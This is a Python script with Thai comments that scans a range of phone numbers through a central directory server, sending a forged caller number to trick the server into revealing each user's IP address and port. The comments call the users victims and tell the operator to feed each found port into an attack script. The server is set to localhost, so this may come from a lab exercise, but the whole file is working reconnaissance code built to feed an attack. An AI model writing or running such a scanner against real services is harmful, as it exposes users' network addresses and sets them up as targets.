import socket
import time
import sys

# --- CONFIGURATION ---
# IP ของ Server กลาง (สมุดหน้าเหลือง)
SERVER_IP = "127.0.0.1"
SERVER_PORT = 5000

# ช่วงเบอร์ที่จะสแกน (ดูจาก Prefix ที่เหยื่อชอบใช้)
# เช่น 0650570400 ถึง 0650570499
TARGET_PREFIX = "06505704" 
START_RANGE = 0
END_RANGE = 99

def scan_target(target_number):
    try:
        # สร้าง Socket เชื่อมไปหา Server
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5) # ตั้งเวลา timeout สั้นๆ จะได้สแกนไวๆ
        sock.connect((SERVER_IP, SERVER_PORT))
        
        # สร้าง Payload หลอกถาม Server
        # Format: เบอร์เรา|พอร์ตเรา|เบอร์เป้าหมาย
        # เราใช้เบอร์ปลอม "9999999999" เพื่อไม่ให้ไปชนกับใคร
        payload = f"9999999999|0|{target_number}"
        sock.send(payload.encode())
        
        # รอคำตอบ
        response = sock.recv(1024).decode(errors='ignore')
        sock.close()
        
        # วิเคราะห์คำตอบ
        if response.startswith("PEER"):
            # Server ตอบกลับมาว่า: PEER|127.0.0.1|6000
            _, ip, port = response.split("|")
            return ip, port
        
        return None # ถ้าตอบ OFFLINE หรืออื่นๆ
        
    except Exception as e:
        # กรณี Server ล่มหรือต่อไม่ได้
        return None

def main():
    print(f"[*] เริ่มสแกน Network ผ่าน Server {SERVER_IP}:{SERVER_PORT}")
    print(f"[*] เป้าหมาย: {TARGET_PREFIX}xx ({START_RANGE}-{END_RANGE})")
    print("-" * 50)

    found_count = 0
    
    for i in range(START_RANGE, END_RANGE + 1):
        # สร้างเบอร์โทรศัพท์ 10 หลัก
        target = f"{TARGET_PREFIX}{i:02d}"
        
        # แสดงผลแบบ Real-time (หมุนติ้วๆ) เพื่อให้รู้ว่าโปรแกรมทำงานอยู่
        sys.stdout.write(f"\r[>] Checking: {target}")
        sys.stdout.flush()
        
        result = scan_target(target)
        
        if result:
            ip, port = result
            # ลบข้อความ Checking ออกแล้วแสดงผลที่เจอ
            sys.stdout.write(f"\r") 
            print(f"✅ FOUND! เบอร์: {target}")
            print(f"   └── IP Address: {ip}")
            print(f"   └── Open Port : {port}  <-- เอาค่านี้ไปใส่ใน script โจมตี")
            print("-" * 50)
            found_count += 1
            
        # หน่วงเวลานิดหน่อย (Optional) เพื่อไม่ให้ Server บล็อก (ถ้ามีระบบกัน)
        # time.sleep(0.01) 

    print(f"\n[*] สแกนเสร็จสิ้น เจอผู้ใช้งานทั้งหมด {found_count} คน")

if __name__ == "__main__":
    main()